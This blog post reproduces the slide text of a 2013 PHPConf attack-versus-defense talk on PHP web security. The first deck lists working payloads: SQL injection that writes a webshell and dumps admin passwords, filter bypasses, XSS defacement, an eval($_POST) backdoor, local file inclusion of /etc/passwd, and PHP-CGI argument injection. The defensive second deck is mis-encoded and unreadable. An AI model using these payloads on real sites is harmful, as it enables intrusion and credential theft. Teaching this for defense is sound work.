---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2013-10-phpconf-2013/
title: "PHPConf 2013 投影片 - 矛盾大對決！ | Orange Tsai"
author: "Orange Tsai"
published: 2013-10-04T16:00:00.000Z
description: "矛盾大對決 - 「能入侵任何網站的駭客 vs. 絕對不會被入侵的網站」這是我在 PHPConf 2013 與 allenown 合講的投影片 另外一份 allenown 的投影片在"
---

* * *

矛盾大對決 \-

## [「能入侵任何網站的駭客 vs. 絕對不會被入侵的網站」](https://blog.orange.tw/posts/2013-10-phpconf-2013/\#%E3%80%8C%E8%83%BD%E5%85%A5%E4%BE%B5%E4%BB%BB%E4%BD%95%E7%B6%B2%E7%AB%99%E7%9A%84%E9%A7%AD%E5%AE%A2-vs-%E7%B5%95%E5%B0%8D%E4%B8%8D%E6%9C%83%E8%A2%AB%E5%85%A5%E4%BE%B5%E7%9A%84%E7%B6%B2%E7%AB%99%E3%80%8D "「能入侵任何網站的駭客 vs. 絕對不會被入侵的網站」")「能入侵任何網站的駭客 vs. 絕對不會被入侵的網站」

這是我在 [PHPConf](http://phpconf.tw/2013/) 2013 與 [allenown](http://blog.orange.tw/) 合講的投影片

PHPConf 2013 - 矛盾大對決 - Speaker Deck

[![Avatar for Orange](https://secure.gravatar.com/avatar/5f7ab2ea341a883bf8572190738e864e?s=47)](https://speakerdeck.com/p8361)

[PHPConf 2013 - 矛盾大對決](https://speakerdeck.com/p8361/phpconf-2013-mao-dun-da-dui-jue)

by [Orange](https://speakerdeck.com/p8361)

[![Speaker Deck](https://d1eu30co0ohy4w.cloudfront.net/assets/mark-white-8d908558fe78e8efc8118c6fe9b9b1a9846b182c503bdc6902f97df4ddc9f3af.svg)](https://speakerdeck.com/)

## Slide 1

### Slide 1 text

矛盾大對決！
2013/10/05 @ PHPConf
Orange@chroot.org



## Slide 2

### Slide 2 text

「能入侵任何網站的駭客」



## Slide 3

### Slide 3 text

About Me
•  蔡政達 aka Orange
•  2009 台灣駭客年會競賽
冠軍
•  2011, 2012 全國資安競賽
金盾獎冠軍
•  2011 東京 AVTOKYO 講師
•  2012 香港 VXRLConf 講師
•  2013 台灣 HITCON
講師
•  台灣 PHPConf, WebConf,
PyConf 講師

•  專精於
–  駭客攻擊手法
–  Web Security
–  Windows Vulnerability
Exploitation



## Slide 4

### Slide 4 text

About Me
•  CHROOT
Security
Group
Member

•  Work
at
DevCore

•  Blog

– h>p://blog.orange.tw/



## Slide 5

### Slide 5 text

我絕對能入侵你的網站！



## Slide 6

### Slide 6 text

SQL INJECTION



## Slide 7

### Slide 7 text

show.php?id=1'
SELECT \* FROM news WHERE id=1'



## Slide 8

### Slide 8 text

No content


## Slide 9

### Slide 9 text

寫後門改首頁
•  show.php?id=20 into outfile '/var/www/.a.php'
lines terminated by ''
•  http://you-shall-not-hack.me/.a.php
– POST echo \`ls -alh\`
– POST \`echo Hack by Orange > index.php\`



## Slide 10

### Slide 10 text

No content


## Slide 11

### Slide 11 text

使用 UNION 污染 SQL 結果
•  show.php?id=1
– SELECT \* FROM news WHERE id=1
•  show.php?id=1 union select 1,2,3
– SELECT \* FROM news WHERE id=1 union select 1,2,3
•  show.php?id=-1 union select 1,2,3
– SELECT \* FROM news WHERE id=-1 union select 1,2,3



## Slide 12

### Slide 12 text

No content


## Slide 13

### Slide 13 text

使用 UNION 泄露敏感資訊
show.php?id=-1 union select 1,user(),database()



## Slide 14

### Slide 14 text

No content


## Slide 15

### Slide 15 text

使用 UNION 取得管理員帳號密碼
show.php?id=-1 union select 1, username, password
from admin where username like '%admin%'



## Slide 16

### Slide 16 text

No content


## Slide 17

### Slide 17 text

繞過空白字元檢查過濾



## Slide 18

### Slide 18 text

繞過空白字元檢查過濾
•  MySQL 解釋語法寬鬆特性
– show.php?id=-1 union select 1,2,3
– show.php?id=-1/\*\*/union/\*\*/select/\*\*/1,2,3
– show.php?id=-1%09union%0Dselect%A01,2,3
– show.php?id=(-1)union(select(1),2,3)



## Slide 19

### Slide 19 text

繞過單引號過濾檢查



## Slide 20

### Slide 20 text

繞過單引號過濾檢查
•  單引號被過濾怎麼辦？
– 還是可以進行 SQL Injection
– ( SELECT 'foo' ) 等價於 ( SELECT 0x666f6f )
– show.php?id=-1 union select username,password,3 from
admin where username like 0x2561646d25
•  into outfile '/var/www/.a.php' 就不能這樣搞了
– 不能寫檔怎麼辦？



## Slide 21

### Slide 21 text

跳出思考框框
•  XSS 並不是只有跳個視窗或是偷 Cookie 而已
•  利用 XSS 劫持 window.onload 修改首頁
–  window.onload = function(){document.write(/
Hacked by Orange/)}



## Slide 22

### Slide 22 text

No content


## Slide 23

### Slide 23 text

No content


## Slide 24

### Slide 24 text

DOUBLE QUOTE EVALUATION



## Slide 25

### Slide 25 text

Double Quote Evaluaion
•  網站變數？
– 存資料庫？
– 但是如果是資料庫連線密碼怎麼辦？
– 存檔案？
– config.php ?




## Slide 26

### Slide 26 text

No content


## Slide 27

### Slide 27 text

Double Quote Evalutation
•  $db\_user = "root";
•  $db\_user = "root $foo";
•  $db\_user = "root ${@phpinfo()}";
•  $db\_user = "root ${@eval($\_POST\[cmd\])}";




## Slide 28

### Slide 28 text

No content


## Slide 29

### Slide 29 text

No content


## Slide 30

### Slide 30 text

Local File Inclusion



## Slide 31

### Slide 31 text

Local File Inclusion

$\_mod = $\_GET\[module\];
include( 'modules/' . $\_mod . '.php' ;)
– index.php?module=login
– index.php?module=logout
– index.php?module=admin
– index.php?module=add




## Slide 32

### Slide 32 text

Local File Inclusion

$\_mod = $\_GET\[module\];
include( 'modules/' . $\_mod . '.php' ;)
– index.php?module=login
– index.php?module=./login
– index.php?module=./login.php%00
– index.php?module=../../../etc/passwd%00




## Slide 33

### Slide 33 text

No content


## Slide 34

### Slide 34 text

Local File Inclusion
•  include( 駭客可控檔案內容 ) = GG
– 上傳圖片
– /var/log/httpd/access.log
– upload + $\_FILES\[file\]\[tmp\_name\]
– /proc/self/environ
•  index.php?module=../../../../proc/self/environ
– User-Agent:



## Slide 35

### Slide 35 text

No content


## Slide 36

### Slide 36 text

No content


## Slide 37

### Slide 37 text

No content


## Slide 38

### Slide 38 text

PHP-CGI Argument Injection



## Slide 39

### Slide 39 text

PHP-CGI Argument Injection
•  index.php?-s
– php-cgi -s index.php



## Slide 40

### Slide 40 text

No content


## Slide 41

### Slide 41 text

PHP-CGI Argument Injection
•  index.php?-d+allow\_url\_include%3dOn+-d
+auto\_prepend\_file%3dphp://input
– php-cgi
-d allow\_url\_include=On



-d auto\_prepend\_file=php://input



## Slide 42

### Slide 42 text

No content


## Slide 43

### Slide 43 text

No content


## Slide 44

### Slide 44 text

Thanks :)
Orange@chroot.org



另外一份 allenown 的投影片在

PHPConf 2013 - 矛盾大對決 - Speaker Deck

[![Avatar for Allen Own](https://secure.gravatar.com/avatar/51b26506f600ed92d091ce6e2dfdcc1f?s=47)](https://speakerdeck.com/allenown)

[PHPConf 2013 - 矛盾大對決](https://speakerdeck.com/allenown/phpconf-2013-mao-dun-da-dui-jue)

by [Allen Own](https://speakerdeck.com/allenown)

[![Speaker Deck](https://d1eu30co0ohy4w.cloudfront.net/assets/mark-white-8d908558fe78e8efc8118c6fe9b9b1a9846b182c503bdc6902f97df4ddc9f3af.svg)](https://speakerdeck.com/)

## Slide 1

### Slide 1 text

ͧ޷ɽ࿁Ӕl
!1)1$POG
BMMFOPXO!DISPPUPSH
BMMFOPXO!EFWDPSF



## Slide 2

### Slide 2 text

ഒ࿁ʔึ஗ɝڧٙၣ१



## Slide 3

### Slide 3 text

"CPVU.F
ॽख͍BLB"MMFO0XO
%&7$03&ੂБڗࡒ΍Ν௴፬ɛ
̨ᝄᎡ܄ϋึᘩᒄୋɧΤ
Ό਷༟τᘩᒄږ޷ᆤڿࠏ
̨ᝄᎡ܄ϋึ ਓᐼ̜
1)1$POG
8FC$POG
̨ᝄ΢ɽਖ਼৫ࣧᑺࢪ
ਖ਼ၚ׵
Ꭱ܄ҸᏘ˓ج
8FC4FDVSJUZ
༟ৃτΌӻ୕ܔໄ



## Slide 4

### Slide 4 text

Ңٙၣ१ഒ࿁ʔึ஗ɝڧl



## Slide 5

### Slide 5 text

̈םыl0SBOHFl



## Slide 6

### Slide 6 text

TIPXQIQ JE
4&-&$5'30.OFXT8)&3&JE



## Slide 7

### Slide 7 text

TIPXQIQ JE03
4&-&$5'30.OFXT8)&3&JE03



## Slide 8

### Slide 8 text

̘દ٤ͣl
TIPXQIQ JE03
4&-&$5'30.OFXT8)&3&JE03
Ⴇ̩ఱʔϓͭəыl



## Slide 9

### Slide 9 text

JETUS@SFQMBDF 

JE
SFT

ᅺ๟፹ႬЪج



## Slide 10

### Slide 10 text

No content


## Slide 11

### Slide 11 text

༟ࣘࢫᛆࠢ
• ၣ१e༟ࣘࢫცࠅʱක
• ༟ࣘࢫԴ͜٫ᛆࠢ̀඲ࠥЭ
• Դ͜٫߰ڢცࠅ'\*-&ᛆࠢা੻ࣅદ



## Slide 12

### Slide 12 text

౬ЫҸᏘəl



## Slide 13

### Slide 13 text

̘દఊˏ໮dႧ̩ఱʔϓͭəыl
TIPXQIQ JE6/\*0/4&-&$5
VTFSOBNF
QBTTXPSE
'30.BENJO
8)&3&VTFSOBNF-\*,&BENJO
TIPXQIQ JE6/\*0/4&-&$5VTFSOBNF

QBTTXPSE
'30.BENJO8)&3&VTFSOBNF-\*,&
BENJO



## Slide 14

### Slide 14 text

No content


## Slide 15

### Slide 15 text

ഃܙҸᏘʕ5@5



## Slide 16

### Slide 16 text

Ⴉॆࡌూ42-\*OKFDUJPO



## Slide 17

### Slide 17 text

ԣੁ42-\*OKFDUJPO
• Դ͜1SFQBSFE4UBUFNFOUT
• ᘌ੗ٙᏨݟהϞ፩ɝ࠽dкᓙᜊᅰٙۨ࿒ආ
Бᔷ࠽fԷνԴ͜JOUWBM

• Դ͜ཀᓩοЕՌᅰཀᓩڢجٙοʩdԷν
NZTRM@SFBM@FTDBQF@TUSJOH
eBEETMBTIFT

– ءจEPVCMFCZUFTFODPEJOHਪᕚdცԴ͜65'
• Դ͜4UPSFE1SPDFEVSFT
• છ၍፹Ⴌৃࢹ̥Ϟ၍ଣ٫̙˸ቡᛘ
• છ၍༟ࣘࢫʿၣ१Դ͜٫੮໮ᛆࠢމО



## Slide 18

### Slide 18 text

$SPTT4JUF4DSJQUJOH 944




## Slide 19

### Slide 19 text

$SPTT4JUF4DSJQUJOH 944

• ΂О፩ɝe፩̈࠽ேʔ̙ڦ΂l
• 1)1Դ͜IUNMFOUJUJFT
ཀᓩοЕ
• ءจ༟ࣘࢫٙ፩̈ɰცࠅཀᓩdΪމೌجᆽ
Ⴉ݊щϞՉ˼ెจٙοЕί༟ࣘࢫʕf
• Դͣ͜ΤఊዚՓཀᓩdϾʔఊ̥݊ලΤఊ
• 08"41$SPTT4JUF4DSJQUJOH1SFWFOUJPO$IFBU
4IFFU
– IUUQXXXPXBTQPSHJOEFYQIQ
944@ $SPTT@4JUF@4DSJQUJOH
@1SFWFOUJPO@$IFBU@4IF
FU



## Slide 20

### Slide 20 text

No content


## Slide 21

### Slide 21 text

ϓ̌ԣςҢٙၣ१l



## Slide 22

### Slide 22 text

ЫᒔϞם෗k0SBOHF



## Slide 23

### Slide 23 text

No content


## Slide 24

### Slide 24 text

%PVCMF2VPUF&WBMVBUJPO
• ࣬ኽʔΝ፩̈ٙή˙Ӕ֛ʔΝڜኺ˙ό
– ၣࠫIUNMFOUJUJFT

– ༟ࣘࢫԣ˟42-\*OKFDUJPO
• ٜટ̘ৰഃўϞ1)1Ⴇجʘतࣿୌ໮
• Դ͜4JOHMF2VPUFϾڢ%PVCMF2VPUF



## Slide 25

### Slide 25 text

No content


## Slide 26

### Slide 26 text

ҁΌς௪ll



## Slide 27

### Slide 27 text

ΎԸdҢ࣎੻Иٙl̈םыl



## Slide 28

### Slide 28 text

No content


## Slide 29

### Slide 29 text

Orz



## Slide 30

### Slide 30 text

 -PDBM'JMF\*ODMVTJPO
• Դ͜\*OEFY)BTIഃ˙جdϾڢٜટᛘ՟Ꮶ
ࣩ
• ᒒеਗ਼ӷ੗ي΁ٜટᅳᚣഗԴ͜٫
• ᜕ᗇהϞي΁݊щމ͍ᆽي΁



## Slide 31

### Slide 31 text

௰ܝədҢҞʔБə



## Slide 32

### Slide 32 text

1)1$(\*"SHVNFOU\*OKFDUJPO
• ̥ঐһอə
• 8"'IUBDDFTTഃ˙جҪהϞཀᓩદ
– 3FXSJUF$POE\\26&3:@453\*/(^? E\]=


– 3FXSJUF3VMF 
<'
->



## Slide 33

### Slide 33 text

ɽ኷ཀܝ0S\[\
\
\
\
## Slide 34\
\
### Slide 34 text\
\
ʃഐ\
• Ꭱ܄ܠၪ༧ɓছɛʔΝ\
• Ꭱ܄ҸᏘ˓جεd̀඲ə༆ҸᏘ˓جdʑঐ\
০࿁ՉආБԣጏf\
• ӚԫʔࠅญՑᎡ܄f\
\
\
\
## Slide 35\
\
### Slide 35 text\
\
2"\
\
\
\
## Slide 36\
\
### Slide 36 text\
\
ʔཀᛍ࿁ʔ࿁k\
\
\
\
## Slide 37\
\
### Slide 37 text\
\
No content